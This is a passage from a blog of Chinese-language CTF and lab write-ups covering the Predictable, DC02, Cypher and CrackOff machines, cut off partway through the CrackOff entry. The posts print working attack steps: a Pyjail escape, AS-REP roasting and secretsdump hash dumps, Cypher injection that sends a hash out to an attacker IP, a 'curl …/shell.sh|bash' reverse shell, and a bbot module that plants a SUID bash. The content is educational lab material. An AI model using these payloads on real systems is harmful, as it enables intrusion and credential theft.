x.__name__==\u0026#34;_wrap_clo\u0026#34;+\u0026#34;se\u0026#34;][0][\u0026#34;sys\u0026#34;+\u0026#34;tem\u0026#34;](\u0026#34;id\u0026#34;) 进入shell只需要开启一个bash就行了\n[ x.__init__.__globals__ for x in \u0026#39;\u0026#39;.__class__.__base__.__subclasses__() if x.__name__==\u0026#34;_wrap_clo\u0026#34;+\u0026#34;se\u0026#34;][0][\u0026#34;sys\u0026#34;+\u0026#34;tem\u0026#34;](\u0026#34;/bin/bash -p\u0026#34;) Root #\rMethod 1 #\r查看特殊命令\nmash@predictable:~$ sudo -l\rMatching Defaults entries for mash on predictable:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser mash may run the following commands on predictable:\r(root) NOPASSWD: /opt/shell 试着运行一下\nmash@predictable:~$ sudo /opt/shell\rUso: ./shell input\rPista: ./shell -h\rmash@predictable:~$ sudo /opt/shell -h\r¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado\r你知道EI_VERSION可以有不同的值吗？radare2已安装 经过搜索，Radare2是一个逆向工具，他的项目地址👇\nradareorg/radare2: UNIX-like reverse engineering framework and command-line toolset 接下来进行分析这个二进制文件\n[0x000010a0]\u0026gt; aa\rINFO: Analyze all flags starting with sym. and entry0 (aa)\rINFO: Analyze imports (af@@@i)\rINFO: Analyze entrypoint (af@ entry0)\rINFO: Analyze symbols (af@@@s)\rINFO: Recovering variables\rINFO: Analyze all functions arguments/locals (afva@@@F)\r[0x000010a0]\u0026gt; afl\r0x00001030 1 6 sym.imp.puts\r0x00001040 1 6 sym.imp.fread\r0x00001050 1 6 sym.imp.system\r0x00001060 1 6 sym.imp.printf\r0x00001070 1 6 sym.imp.strcmp\r0x00001080 1 6 sym.imp.fseek\r0x00001090 1 6 sym.imp.fopen\r0x000010a0 1 37 entry0\r0x000012a0 1 13 sym._fini\r0x00001199 9 262 main\r0x00001000 3 27 sym._init\r0x00001190 5 60 entry.init0\r0x00001140 5 55 entry.fini0\r0x000010d0 4 34 fcn.000010d0\r[0x000010a0]\u0026gt; pdf @ main\r; DATA XREF from entry0 @ 0x10b8(r)\r┌ 262: int main (int argc, char **argv);\r│ ; arg int argc @ rdi\r│ ; arg char **argv @ rsi\r│ ; var int64_t var_8h @ rbp-0x8\r│ ; var int64_t var_10h @ rbp-0x10\r│ ; var int64_t var_14h @ rbp-0x14\r│ ; var int64_t var_20h @ rbp-0x20\r│ 0x00001199 55 push rbp\r│ 0x0000119a 4889e5 mov rbp, rsp\r│ 0x0000119d 4883ec20 sub rsp, 0x20\r│ 0x000011a1 897dec mov dword [var_14h], edi ; argc\r│ 0x000011a4 488975e0 mov qword [var_20h], rsi ; argv\r│ 0x000011a8 837dec02 cmp dword [var_14h], 2\r│ ┌─\u0026lt; 0x000011ac 7423 je 0x11d1\r│ │ 0x000011ae 488d05530e.. lea rax, str.Uso:_._shell_input ; 0x2008 ; \u0026#34;Uso: ./shell input\u0026#34;\r│ │ 0x000011b5 4889c7 mov rdi, rax\r│ │ 0x000011b8 e873feffff call sym.imp.puts ; int puts(const char *s)\r│ │ 0x000011bd 488d05570e.. lea rax, str.Pista:_._shell__h ; 0x201b ; \u0026#34;Pista: ./shell -h\u0026#34;\r│ │ 0x000011c4 4889c7 mov rdi, rax\r│ │ 0x000011c7 e864feffff call sym.imp.puts ; int puts(const char *s)\r│ ┌──\u0026lt; 0x000011cc e9c7000000 jmp 0x1298\r│ │└─\u0026gt; 0x000011d1 488b45e0 mov rax, qword [var_20h]\r│ │ 0x000011d5 4883c008 add rax, 8\r│ │ 0x000011d9 488b00 mov rax, qword [rax]\r│ │ 0x000011dc 4889c6 mov rsi, rax\r│ │ 0x000011df 488d05470e.. lea rax, [0x0000202d] ; \u0026#34;-h\u0026#34;\r│ │ 0x000011e6 4889c7 mov rdi, rax\r│ │ 0x000011e9 e882feffff call sym.imp.strcmp ; int strcmp(const char *s1, const char *s2)\r│ │ 0x000011ee 85c0 test eax, eax\r│ │┌─\u0026lt; 0x000011f0 7514 jne 0x1206\r│ ││ 0x000011f2 488d05370e.. lea rax, str.Sabias_que_EI_VERSION_puede_tener_diferentes_valores_._radare2_esta_instalado ; 0x2030\r│ ││ 0x000011f9 4889c7 mov rdi, rax\r│ ││ 0x000011fc e82ffeffff call sym.imp.puts ; int puts(const char *s)\r│ ┌───\u0026lt; 0x00001201 e992000000 jmp 0x1298\r│ ││└─\u0026gt; 0x00001206 488d05730e.. lea rax, [0x00002080] ; \u0026#34;r\u0026#34;\r│ ││ 0x0000120d 4889c6 mov rsi, rax\r│ ││ 0x00001210 488d056b0e.. lea rax, str.shell ; 0x2082 ; \u0026#34;shell\u0026#34;\r│ ││ 0x00001217 4889c7 mov rdi, rax\r│ ││ 0x0000121a e871feffff call sym.imp.fopen ; file*fopen(const char *filename, const char *mode)\r│ ││ 0x0000121f 488945f0 mov qword [var_10h], rax\r│ ││ 0x00001223 488b45f0 mov rax, qword [var_10h]\r│ ││ 0x00001227 ba00000000 mov edx, 0\r│ ││ 0x0000122c be06000000 mov esi, 6\r│ ││ 0x00001231 4889c7 mov rdi, rax\r│ ││ 0x00001234 e847feffff call sym.imp.fseek ; int fseek(FILE *stream, long offset, int whence)\r│ ││ 0x00001239 488b55f0 mov rdx, qword [var_10h]\r│ ││ 0x0000123d 488b45f8 mov rax, qword [var_8h]\r│ ││ 0x00001241 4889d1 mov rcx, rdx\r│ ││ 0x00001244 ba01000000 mov edx, 1\r│ ││ 0x00001249 be01000000 mov esi, 1\r│ ││ 0x0000124e 4889c7 mov rdi, rax\r│ ││ 0x00001251 e8eafdffff call sym.imp.fread ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)\r│ ││ 0x00001256 488b45f8 mov rax, qword [var_8h]\r│ ││ 0x0000125a 0fb600 movzx eax, byte [rax]\r│ ││ 0x0000125d 3c01 cmp al, 1\r│ ││┌─\u0026lt; 0x0000125f 7423 je 0x1284\r│ │││ 0x00001261 488b45e0 mov rax, qword [var_20h]\r│ │││ 0x00001265 4883c008 add rax, 8\r│ │││ 0x00001269 488b00 mov rax, qword [rax]\r│ │││ 0x0000126c 0fb600 movzx eax, byte [rax]\r│ │││ 0x0000126f 3c30 cmp al, 0x30 ; \u0026#39;0\u0026#39;\r│ ┌────\u0026lt; 0x00001271 7511 jne 0x1284\r│ ││││ 0x00001273 488d050e0e.. lea rax, str._bin_bash ; 0x2088 ; \u0026#34;/bin/bash\u0026#34;\r│ ││││ 0x0000127a 4889c7 mov rdi, rax\r│ ││││ 0x0000127d e8cefdffff call sym.imp.system ; int system(const char *string)\r│ ┌─────\u0026lt; 0x00001282 eb14 jmp 0x1298\r│ │└──└─\u0026gt; 0x00001284 488d05070e.. lea rax, str.Bleh_n ; 0x2092 ; \u0026#34;Bleh~~\\n\u0026#34;\r│ │ ││ 0x0000128b 4889c7 mov rdi, rax\r│ │ ││ 0x0000128e b800000000 mov eax, 0\r│ │ ││ 0x00001293 e8c8fdffff call sym.imp.printf ; int printf(const char *format)\r│ │ ││ ; CODE XREFS from main @ 0x11cc(x), 0x1201(x), 0x1282(x)\r│ └─└└──\u0026gt; 0x00001298 b800000000 mov eax, 0\r│ 0x0000129d c9 leave\r└ 0x0000129e c3 ret 扔给Deepseek快速分析一下\n程序大概分为两个部分\n第一部分\r比较argv[1]和“-h”是否相等。如果相等，即strcmp返回0，则跳转到打印提示信息，然后直接退出。因此如果用户输入的是“-h”参数，就会显示帮助信息，不会执行shell。\r接下来，如果参数不是“-h”，程序继续执行：\r第二部分\r程序打开了一个名为\u0026#34;shell\u0026#34;的文件，跳转到第6个字节的位置（偏移量6），然后读取1个字节到var_8h指向的位置。\r如果这个字节不等于1，程序继续执行。\r如果该字符是\u0026#39;0\u0026#39;，则执行system(\u0026#34;/bin/bash\u0026#34;)，否则打印Bleh~~。 总结一下\nargc必须为2，即程序带一个参数。\n参数不能是“-h”。\n程序会打开当前目录下的\u0026quot;shell\u0026quot;文件，读取其第6个字节（偏移量6）的一个字节，该字节必须不等于1。\n同时，传入的参数的第一个字符必须是'0\u0026rsquo;（即argv[1][0] == \u0026lsquo;0\u0026rsquo;）。\n使用r2进行修改\nmash@predictable:/opt$ r2 -w shell # -w is write mode\r[0x000010a0]\u0026gt; s 0x06 # jump to addr 0x06\r[0x00000006]\u0026gt; w 0 # overwrite 0\r[0x00000006]\u0026gt; q # save and exit Method 2 #\r由于我们是可以修改**/opt/shell**的，因此可以直接将提权代码追加到其中，这应该算是作者的疏漏？？？\nSummary #\rUser：网页源码泄露出随机数生成逻辑，用得到的序列进行反推，得到加密参数，计算出第一百个数字，输入得到登录凭证。\nRoot：ssh登录后就是Pyjail，过滤关键字可以用**+号进行拼接，也不是很严格，网上可以随便找payload**。查看到特殊权限命令，需要使用r2工具分析main函数的具体功能，修改0x06上的字节即可绕过。因为该二进制文件是可写的，所以也可以直接添加提权命令。\n","date":"2025-03-04","externalUrl":null,"permalink":"/posts/2025/03/dockerlabs-predictable/","section":"Posts","summary":"","title":"Dockerlabs-predictable","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.126 -sV -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 18:44 CST\rNmap scan report for 192.168.56.126\rHost is up (0.00028s latency).\rNot shown: 989 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-02 23:47:04Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rMAC Address: 08:00:27:4E:CF:21 (Oracle VirtualBox virtual NIC)\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.84 seconds 把SOUPEDECODE.LOCAL、DC01.SOUPEDECODE.LOCAL添加到**/etc/hosts**\nUserEnum #\r尝试enum4linux结果不允许空名枚举\n并且在DC03中尝试过的LLMNR中毒攻击也没有任何反应\n因此只能通过kerberos来进行用户枚举\nropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcing 用外部字典扫描到四个存在的用户\n利用点应该是从charlie入手，需要注意的是要同步时区！！！！！\n[root@kali] /home/kali/DC02 ❯ ntpdate soupedecode.local 得到charlie的密码就是charlie\n使用crackmapexec获取到用户名列表\n[root@kali] /home/kali/DC02 ❯ crackmapexec smb 192.168.56.126 -u charlie -p charlie --rid-brute | grep SidTypeUser | sed \u0026#39;s/.*\\\\\\(.*\\)(.*/\\1/\u0026#39; \u0026gt; usernames.txt GetNPUsers #\r查看哪些用户没有设置预认证\n[root@kali] /home/kali/DC02 ❯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;192.168.56.126\u0026#34; soupedecode.local/ 爆破得到密码\nzximena448:internet Bloodhound #\r尽管目标机器上开放了53端口，存在DNS服务，但是呢经过测试是不可用的。\n因此需要在本地开启一个dnschef，伪造DNS服务，也可以充当DNS服务器，绕过解析\n[root@kali] /home/kali ❯ dnschef --fakeip 192.168.56.126\r[root@kali] /home/kali/DC02 ❯ bloodhound-python -u \u0026#39;zximena448\u0026#39; -p \u0026#39;internet\u0026#39; -ns 127.0.0.1 -d SOUPEDECODE.LOCAL -dc DC01.SOUPEDECODE.LOCAL --zip 可以看到当前的ZXIMENA448用户属于BackupOperators组\n这在我之前写过的一篇文章中遇到过：HTB-Blackfield - HYH\n可以参考的文章👇\nBackup Operator Privilege Escalation \u0026lt; BorderGate 现在本地开启一个smb服务\n[root@kali] /tmp/shared ❯ impacket-smbserver -smb2support -ts -debug share /tmp/shared 然后提取 SAM 数据\n[root@kali] /home/kali/DC02/backup_dc_registry (main) ❯ impacket-reg -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/zximena448:internet@192.168.56.126 backup -o \u0026#39;\\\\192.168.56.104\\share\u0026#39; 下面这个Administrator的hash是无法使用的\n[root@kali] /tmp/shared ❯ impacket-secretsdump -system SYSTEM.save -sam SAM.save -security SECURITY.save LOCAL ⏎\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6\r[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information.\r[*] Dumping cached domain logon information (domain/username:hash)\r[*] Dumping LSA Secrets\r[*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:a2d41e766e263b6324dcbd7aff4b69b3c42e44658e119ba6a43eae3f1da750a7689e19b94127d12e63171960583effc488a64efc45fa83d296e9f3cbcdccdbc693a3724e303fc24a67a183fbb60e6b0a2bf3638e60dbf01ad0b84b6cde6ff73d4c2a8a6a4bcb3027e0ccd34f360309b1551c684a13e4aac89c65effd462c458305181e08af5911c50c537f8f3f7280297ef15b961a3150a4caa27284be9120f7f786454f7db8282311573011a2d3d753f969493522d2d4d76e513903b63767f7b393ef389616d4faba451a683231add72167785765816010fa65786306ec10dd2ce0fd50cc4db6b304e9a60562852f7f\r$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3582a8b74d192bbeca8a23cd2022baae\r[*] DPAPI_SYSTEM dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4\rdpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503\r[*] NL$KM 0000 44 C5 ED CE F5 0E BF 0C 15 63 8B 8D 2F A3 06 8F D........c../...\r0010 62 4D CA D9 55 20 44 41 75 55 3E 85 82 06 21 14 bM..U DAuU\u0026gt;...!.\r0020 8E FA A1 77 0A 9C 0D A4 9A 96 44 7C FC 89 63 91 ...w......D|..c.\r0030 69 02 53 95 1F ED 0E 77 B5 24 17 BE 6E 80 A9 91 i.S....w.$..n...\rNL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991\r[*] Cleaning up... 但是获取到了机器账户的hash ($MACHINE.ACC)\nMachineAccount是每台计算机在安装系统后默认生成的计算机帐户\nPasswordSpray #\r进行密码喷洒，发现这个hash是DC01用户的\n[root@kali] /home/kali/DC02 ❯ crackmapexec smb 192.168.56.126 -u usernames.txt -H \u0026#39;3582a8b74d192bbeca8a23cd2022baae\u0026#39; ⏎\rSMB 192.168.56.126 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)\rSMB 192.168.56.126 445 DC01 [-] SOUPEDECODE.LOCAL\\Administrator:3582a8b74d192bbeca8a23cd2022baae STATUS_LOGON_FAILURE SMB 192.168.56.126 445 DC01 [-] SOUPEDECODE.LOCAL\\Guest:3582a8b74d192bbeca8a23cd2022baae STATUS_LOGON_FAILURE SMB 192.168.56.126 445 DC01 [-] SOUPEDECODE.LOCAL\\krbtgt:3582a8b74d192bbeca8a23cd2022baae STATUS_LOGON_FAILURE SMB 192.168.56.126 445 DC01 [+] SOUPEDECODE.LOCAL\\DC01$:3582a8b74d192bbeca8a23cd2022baae 再次进行secrets-dump，查看是否在DC01上保存有Admin的hash\n[root@kali] /home/kali/DC02 ❯ impacket-secretsdump SOUPEDECODE.LOCAL/\u0026#39;DC01$\u0026#39;@192.168.56.126 -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:3582a8b74d192bbeca8a23cd2022baae\u0026#39; -target-ip 192.168.56.126 | grep Administrator ⏎\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::\rAdministrator:aes256-cts-hmac-sha1-96:01dc1e0f079f2dfe4a880156b7192acc658b8733cc87f1c5be32c291ad8e0318\rAdministrator:aes128-cts-hmac-sha1-96:4b4cf4064e92346339b1a3ef3ff65d6b\rAdministrator:des-cbc-md5:b0614357f8160ef4 最后使用Evil-winrm登录\nSummary #\r先通过kerbrute进行用户名爆破，再检查到了没有设置Kerberos预认证的用户，泄露出用户哈希，获取到用户zximena448。\nzximena448用户属于Backup Operators组，可以利用其权限获取到SAM等数据文件。分析得到域内默认机器DC01的密码哈希。\n最后在DC01的机器上进行哈希提取，应该是Administrator登陆过DC01，因此提取到了他的哈希值。\n","date":"2025-03-03","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-dc02/","section":"Posts","summary":"","title":"HackMyVm-DC02","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Cypher ❯ nmap cypher.htb -sV -A -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)\r|_ 256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)\r80/tcp open http nginx 1.24.0 (Ubuntu)\r|_http-title: GRAPH ASM\r|_http-server-header: nginx/1.24.0 (Ubuntu) Dirsearch #\r[root@kali] /home/kali/Desktop ❯ dirsearch -u cypher.htb -t 50 -x 404\rTarget: http://cypher.htb/\rStarting: 200 - 5KB - /about 200 - 5KB - /about.html 307 - 0B - /api -\u0026gt; /api/docs 307 - 0B - /api/ -\u0026gt; http://cypher.htb/api/api 307 - 0B - /demo/ -\u0026gt; http://cypher.htb/api/demo 307 - 0B - /demo -\u0026gt; /login 200 - 4KB - /login.html 200 - 4KB - /login 301 - 178B - /testing -\u0026gt; http://cypher.htb/testing/ Task Completed Cypher Injection #\r进入登录页面，尝试进行SQL注入，得到报错回显\n{message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))\r\u0026#34;MATCH (u:USER) -[:SECRET]-\u0026gt; (h:SHA1) WHERE u.name = \u0026#39;admin\u0026#39;\u0026#39; return h.value as hash\u0026#34;\r^} 似乎存在着Cypher注入，下面是一些文章\nFun with Cypher Injections - HackMD\nProtecting against Cypher Injection - Knowledge Base\nCypher Injection Cheat Sheet - Pentester Land\n这里尝试的是SSRF外带出admin用户的hash值\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#39; OR 1=1 LOAD CSV FROM \u0026#39;http://10.10.xx.xx/ppp=\u0026#39;+h.value AS y Return \u0026#39;\u0026#39;//\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;} 9f54ca4c130be6d529a56dee59dc2b2090e43acf 不幸的是，这个并不能被破解。。。。。而且更换用户也是一样的hash\n查看之前的反编译\npackage com.cypher.neo4j.apoc;\rimport java.io.BufferedReader;\rimport java.io.InputStreamReader;\rimport java.util.Arrays;\rimport java.util.concurrent.TimeUnit;\rimport java.util.stream.Stream;\rimport org.neo4j.procedure.Description;\rimport org.neo4j.procedure.Mode;\rimport org.neo4j.procedure.Name;\rimport org.neo4j.procedure.Procedure;\r/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */\rpublic class CustomFunctions {\r@Procedure(name = \u0026#34;custom.getUrlStatusCode\u0026#34;, mode = Mode.READ)\r@Description(\u0026#34;Returns the HTTP status code for the given URL as a string\u0026#34;)\rpublic Stream\u0026lt;StringOutput\u0026gt; getUrlStatusCode(@Name(\u0026#34;url\u0026#34;) String url) throws Exception {\rif (!url.toLowerCase().startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.toLowerCase().startsWith(\u0026#34;https://\u0026#34;)) {\rurl = \u0026#34;https://\u0026#34; + url;\r}\rString[] command = {\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \u0026#34; + url};\rSystem.out.println(\u0026#34;Command: \u0026#34; + Arrays.toString(command));\rProcess process = Runtime.getRuntime().exec(command);\rBufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\rBufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\rStringBuilder errorOutput = new StringBuilder();\rwhile (true) {\rString line = errorReader.readLine();\rif (line == null) {\rbreak;\r}\rerrorOutput.append(line).append(\u0026#34;\\n\u0026#34;);\r}\rString statusCode = inputReader.readLine();\rSystem.out.println(\u0026#34;Status code: \u0026#34; + statusCode);\rboolean exited = process.waitFor(10L, TimeUnit.SECONDS);\rif (!exited) {\rprocess.destroyForcibly();\rstatusCode = \u0026#34;0\u0026#34;;\rSystem.err.println(\u0026#34;Process timed out after 10 seconds\u0026#34;);\r} else {\rint exitCode = process.exitValue();\rif (exitCode != 0) {\rstatusCode = \u0026#34;0\u0026#34;;\rSystem.err.println(\u0026#34;Process exited with code \u0026#34; + exitCode);\r}\r}\rif (errorOutput.length() \u0026gt; 0) {\rSystem.err.println(\u0026#34;Error output:\\n\u0026#34; + errorOutput.toString());\r}\rreturn Stream.of(new StringOutput(statusCode));\r}\r/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */\rpublic static class StringOutput {\rpublic String statusCode;\rpublic StringOutput(String statusCode) {\rthis.statusCode = statusCode;\r}\r}\r} 可以看到是apoc包里面的，并且它的调用是custom.getUrlStatusCode\n值得注意的是，这里是直接把URL拼接，然后传递给**/bin/sh**执行\n这里需要先返回h.value否则在比对密码的时候会直接报错，影响后面的执行\n并且联合注入要求的两个列名必须相同，也就是AS后面接同样的列名\n使用联合注入，调用这个custom.getUrlStatusCode\n{\r\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#39; return h.value AS value UNION CALL custom.getUrlStatusCode(\\\u0026#34;127.0.0.1;curl 10.10.xx.xx/shell.sh|bash;\\\u0026#34;) YIELD statusCode AS value RETURN value ; //\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123\u0026#34;\r} custom.getUrlStatusCode是必须要执行成功才会返回statusCode，从而加入列的第二行。因此前面我插入的是127.0.0.1，保证能够返回一个正常状态码。\n成功反弹到Shell，可以直接进入**/home/graphasm**\n读取bbot_preset.yml得到密码\n登录到graphsam，获取到user.txt\nRoot #\r查看sudo\ngraphasm@cypher:~$ sudo -l\rMatching Defaults entries for graphasm on cypher:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser graphasm may run the following commands on cypher:\r(ALL) NOPASSWD: /usr/local/bin/bbot bbot的内容如下\ngraphasm@cypher:~$ cat /usr/local/bin/bbot\r#!/opt/pipx/venvs/bbot/bin/python\r# -*- coding: utf-8 -*-\rimport re\rimport sys\rfrom bbot.cli import main\rif __name__ == \u0026#39;__main__\u0026#39;:\rsys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0])\rsys.exit(main()) 本来想在当前目录写入同名python文件来进行提权，但是目录没有写的权限，查看一下是否可以写入配置来启动bbot\n注意到**--custom-yara-rules**可以引入规则\n因此可以尝试把root.txt引入，并且开启debug模式\ngraphasm@cypher:/usr/local/bin$ sudo /usr/local/bin/bbot -cy /root/root.txt --debug 我尝试读取ssh密钥，只能读取到id_ed25519，而且并没有authorized_keys，因此无法SSH登录\n查看module的目录权限，无法写入。\n参考一下官网上的具体配置\nConfiguration - BBOT Docs\nHow to Write a BBOT Module - BBOT Docs\nOverview - BBOT Docs\nPresets - BBOT Docs\n发现可以自己指定配置文件，并且创建新的模块。\n因此先写入一个模块的目录文件 myconf.yml\nmodule_dirs:\r- /tmp/modules 然后在**/tmp/modules中写入根据模板修改后具有提权部分的代码，命名为whois2.py**👇\nfrom bbot.modules.base import BaseModule\rimport os\rclass whois2(BaseModule):\rwatched_events = [\u0026#34;DNS_NAME\u0026#34;] # watch for DNS_NAME events\rproduced_events = [\u0026#34;WHOIS\u0026#34;] # we produce WHOIS events\rflags = [\u0026#34;passive\u0026#34;, \u0026#34;safe\u0026#34;]\rmeta = {\u0026#34;description\u0026#34;: \u0026#34;Query WhoisXMLAPI for WHOIS data\u0026#34;}\roptions = {\u0026#34;api_key\u0026#34;: \u0026#34;\u0026#34;} # module config options\roptions_desc = {\u0026#34;api_key\u0026#34;: \u0026#34;WhoisXMLAPI Key\u0026#34;}\rper_domain_only = True # only run once per domain\rbase_url = \u0026#34;https://www.whoisxmlapi.com/whoisserver/WhoisService\u0026#34;\r# one-time setup - runs at the beginning of the scan\rasync def setup(self):\ros.system(\u0026#34;cp /bin/bash /tmp/bash \u0026amp;\u0026amp; chmod u+s /tmp/bash\u0026#34;)\rself.api_key = self.config.get(\u0026#34;api_key\u0026#34;)\rif not self.api_key:\r# soft-fail if no API key is set\rreturn None, \u0026#34;Must set API key\u0026#34;\rasync def handle_event(self, event):\rself.hugesuccess(f\u0026#34;Got {event} (event.data: {event.data})\u0026#34;)\r_, domain = self.helpers.split_domain(event.data)\rurl = f\u0026#34;{self.base_url}?apiKey={self.api_key}\u0026amp;domainName={domain}\u0026amp;outputFormat=JSON\u0026#34;\rself.hugeinfo(f\u0026#34;Visiting {url}\u0026#34;)\rresponse = await self.helpers.request(url)\rif response is not None:\rawait self.emit_event(response.json(), \u0026#34;WHOIS\u0026#34;, parent=event) 最后命令行执行，提权成功\nsudo /usr/local/bin/bbot -p ./myconf.yml -m whois2 Summary #\rUser：登陆页面的username处存在Cypher注入，通过泄露的扩展文件可以看到，传入参数是直接通过拼接的方式传递给**/bin/sh**，因此可以构造反弹shell。直接进入**/home/graphasm**拿到用户密码。\nRoot：查看命令的具体参数，可以将root.txt当作规则进行引用，同时开启debug模式，泄露出文件的具体内容。写入新的配置文件以及新的恶意模块，通过参数指定，最后成功提权到root。\n","date":"2025-03-02","externalUrl":null,"permalink":"/posts/2025/03/htb-cypher/","section":"Posts","summary":"","title":"HTB-Cypher","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/crackoff ❯ nmap 172.17.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 21:28 CST\rNmap scan report for sitio.dl (172.17.0.2)\rHost is up (0.00010s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 3d:fc:bd:41:cb:81:e8:cd:a2:58:5a:78:68:2b:a3:04 (ECDSA)\r|_ 256 d8:5a:63:27:60:35:20:30:a9:ec:25:36:9e:50:06:8d (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: CrackOff - Bienvenido\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.10 ms sitio.dl (172.17.0.2)\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 8.67 seconds Gobuster #\r[root@kali] /home/kali/crackoff ❯ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/index.php (Status: 200) [Size: 2974]\r/login.php (Status: 200) [Size: 3968]\r/welcome.php (Status: 200) [Size: 2800]\r/db.php (Status: 302) [Size: 75] [--\u0026gt; error.php]\r/error.php (Status: 200) [Size: 2705]\r/.php (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== SQL Injection #\r进入login.php，发现在username字段中存在SQL注入漏洞，单引号闭合\n将Request复制到一个文件中\n[root@kali] /home/kali/crackoff ❯ sqlmap -r burp.txt -p username --dbs [root@kali] /home/kali/crackoff ❯ sqlmap -r 